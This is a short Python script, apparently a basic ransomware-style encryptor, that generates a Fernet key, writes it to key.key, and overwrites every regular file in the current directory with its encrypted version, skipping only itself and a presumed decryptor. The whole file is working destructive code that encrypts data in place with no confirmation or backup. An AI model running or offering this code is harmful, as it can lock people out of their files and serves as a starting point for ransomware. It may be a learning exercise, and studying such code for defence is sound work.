import  os
from cryptography.fernet import Fernet
files=[]
for file in os.listdir():
    if file == "enc.py" or file == "key.key" or file == "denc.py" :
        continue
    if os.path.isdir(file) :
        continue
    else :
        files.append(file)

securitykey = Fernet.generate_key()
with open ("key.key" , "wb") as key1 :
    key1.write(securitykey)

print(files)
for eeee in files :
    with open (eeee ,"rb") as file1 :
        content = file1.read()
    #ENCRYPTION PROCESS START MAIN DRIVER
    enc_content = Fernet(securitykey).encrypt(content)
    with open (eeee , "wb") as file1 :
        file1.write(enc_content)